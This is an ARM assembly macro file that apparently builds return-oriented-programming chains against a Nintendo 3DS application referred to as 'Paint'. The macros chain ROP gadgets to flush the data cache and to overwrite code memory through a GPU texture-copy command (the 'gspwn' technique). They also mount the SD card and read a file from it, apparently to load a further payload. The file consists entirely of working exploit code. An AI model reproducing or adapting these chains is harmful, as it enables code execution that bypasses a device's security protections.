.macro flush_dcache,addr,size
	set_lr ROP_PAINT_NOP
	.word ROP_PAINT_POP_R0PC
		.word PAINT_GSPGPU_HANDLE ; r0 : handle ptr
	.word ROP_PAINT_POP_R1PC
		.word 0xFFFF8001 ; r1 : process handle
	.word ROP_PAINT_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr ; r2 : addr
		.word size ; r3 : size
		.word 0xDEADC0DE ; r4 : garbage
		.word 0xDEADC0DE ; r5 : garbage
		.word 0xDEADC0DE ; r6 : garbage
	.word PAINT_GSPGPU_FLUSHDATACACHE
.endmacro

.macro gspwn,code_linear_base_ptr,VA,src,size
	deref_to_r0_and_add code_linear_base_ptr,VA
	.word ROP_PAINT_POP_R1PC
		.word @@gxCommandPayload+0x8 ; overwrite destination
	.word ROP_PAINT_STR_R0R1_POP_R4PC
		.word 0xDEADC0DE ; r4 : garbage
	set_lr ROP_PAINT_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_PAINT_POP_R0PC
		.word PAINT_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 : nn__gxlow__CTR__detail__GetInterruptReceiver
	.word ROP_PAINT_POP_R1PC
		.word @@gxCommandPayload ; r1 : cmd addr
	.word PAINT_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word 0xDEADC0DE ; destination address overwritten before (standin, will be filled in)
		.word size ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

.macro deref_and_store,in_ptr,out_ptr
	.word ROP_PAINT_POP_R0PC
	  .word in_ptr
	.word ROP_PAINT_LDR_R0R0_POP_R4PC
	  .word 0xDEADC0DE ; r4 garbage
	.word ROP_PAINT_POP_R1PC
	  .word out_ptr
	.word ROP_PAINT_STR_R0R1_POP_R4PC
	  .word 0xDEADC0DE
.endmacro

.macro set_lr,lr_
	.word ROP_PAINT_POP_R1PC
		.word ROP_PAINT_NOP
	.word ROP_PAINT_POP_R4LR_BX_R1
		.word 0xDEADC0DE
		.word lr_
.endmacro

.macro deref_to_r0_and_add,ptr,value
	.word ROP_PAINT_POP_R0PC
		.word ptr
	.word ROP_PAINT_LDR_R0R0_POP_R4PC
		.word value
	.word ROP_PAINT_ADD_R0_R0R4_POP_R4PC
		.word 0xDEADC0DE
.endmacro

.macro compare_r0_0
	.word ROP_PAINT_CMP_R0_0_MOVNE_R0_0_MOVEQ_R0_1_POP_R4PC
		.word 0xDEADC0DE
.endmacro

.macro store_to_addr_if_equal,addr,value
	set_lr ROP_PAINT_NOP
	.word ROP_PAINT_POP_R1PC
		.word value
	.word ROP_PAINT_POP_R0PC
		.word addr
	.word ROP_PAINT_STREQ_R1R0_BX_LR
.endmacro

.macro store_value,addr,value
	.word ROP_PAINT_POP_R0PC
		.word value
	.word ROP_PAINT_POP_R1PC
		.word addr
	.word ROP_PAINT_STR_R0R1_POP_R4PC
		.word 0xDEADC0DE
.endmacro

.macro store_r0_to,addr
	.word ROP_PAINT_POP_R1PC
		.word addr
	.word ROP_PAINT_STR_R0R1_POP_R4PC
		.word 0xDEADC0DE
.endmacro

.macro sleep,time_l,time_h
	set_lr ROP_PAINT_NOP
	.word ROP_PAINT_POP_R0PC
		.word time_l
	.word ROP_PAINT_POP_R1PC
		.word time_h
	.word PAINT_SVC_SLEEPTHREAD
.endmacro

.macro FS_MountSdmc,sdmc_str_ptr
	.word ROP_PAINT_POP_R0PC
		.word sdmc_str_ptr
	.word PAINT_FS_MOUNTSDMC+0x4
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
.endmacro

FSFILE_READ equ 0x1

.macro FS_TryOpenFile,ctx_ptr,file_path_ptr,openflags
	.word ROP_PAINT_POP_R0PC
	  .word ctx_ptr
	.word ROP_PAINT_POP_R1PC
	  .word file_path_ptr
	.word ROP_PAINT_POP_R2R3R4R5R6PC
	  .word openflags
	  .word 0xDEADC0DE
	  .word 0xDEADC0DE
	  .word 0xDEADC0DE
	  .word 0xDEADC0DE
	.word PAINT_FS_TRYOPENFILE+0x4
	  .word 0xDEADC0DE
	  .word 0xDEADC0DE
	  .word 0xDEADC0DE
	  .word 0xDEADC0DE
	  .word 0xDEADC0DE
.endmacro

.macro FS_TryGetSize,ctx_ptr,out_size
	.word ROP_PAINT_POP_R0PC
		.word ctx_ptr
	.word ROP_PAINT_POP_R1PC
		.word out_size
	.word PAINT_FS_TRYGETSIZE+0x4
		.word 0xDEADC0DE
		.word 0xDEADC0DE
.endmacro

.macro FS_TryReadFile,ctx_ptr,offseth,offsetl,out_bytes_read,size_ptr,dest
	deref_and_store ctx_ptr, @@file_ptr
	deref_and_store size_ptr, @@size
	.word ROP_PAINT_POP_R1PC
	@@file_ptr:
		.word 0xDEADC0DE ; overwritten
	.word ROP_PAINT_POP_R0PC
		.word out_bytes_read
	.word ROP_PAINT_POP_R2R3R4R5R6PC
		  .word offsetl
		  .word offseth
		  .word 0xDEADC0DE
		  .word 0xDEADC0DE
		  .word 0xDEADC0DE
	.word PAINT_FS_TRYREADFILE+0x4
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
	.word ROP_PAINT_POP_R4R5PC
		.word dest
	@@size:
		.word 0xDEADC0DE ; overwritten
.endmacro
